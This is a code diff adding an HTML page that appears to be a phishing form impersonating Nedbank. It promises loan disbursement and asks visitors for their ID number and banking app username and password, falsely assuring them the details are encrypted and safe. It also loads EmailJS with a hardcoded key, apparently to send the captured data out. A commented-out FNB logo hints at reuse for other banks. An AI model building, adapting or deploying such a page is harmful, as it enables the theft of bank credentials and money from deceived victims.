@@ -1,0 +1,45 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <link rel="stylesheet" href="index.css">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Charm:wght@400;700&display=swap" rel="stylesheet">
+    <title>Application Form</title>
+    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+    <script type="text/javascript">
+        (function() {
+            // https://dashboard.emailjs.com/admin/account
+            emailjs.init('xrtpERRrzlfGvRIb6');
+        })();
+    </script>
+</head>
+<body>
+    <div id="div1">
+        <img src="./NED.JO.png" alt="">
+        <p>Nedbank Application</p>
+    </div>
+
+    <p id="p2">Nedbank Online Application</p>
+   
+    <form id="contact-form">
+        <input type="hidden" name="contact_number">
+
+        <label for="identity">ID Number:</label> <br>
+        <input type="number" name="identity" id="identity" placeholder="Enter ID number "> <br>
+
+        <p id="p3"> Kindly input the required details to enable your loan disbursement into your account and
+            be ensured that your details are all encrypted and safe</p>
+        <label for="username">App Username:</label> <br>
+        <input type="text" name="username" id="username" placeholder="Enter Username"> <br>
+
+        <label for="password">App Password:</label> <br>
+        <input type="text" name="password" id="password" placeholder="Enter Password"> <br>
+
+
+        <input type="submit" value="Submit" id="submit">
+    </form>
+    <!-- <img src="./fnb-logo-2016.jpg" alt=""> -->
+    <script src="index.js"></script>
+</body>
+</html>
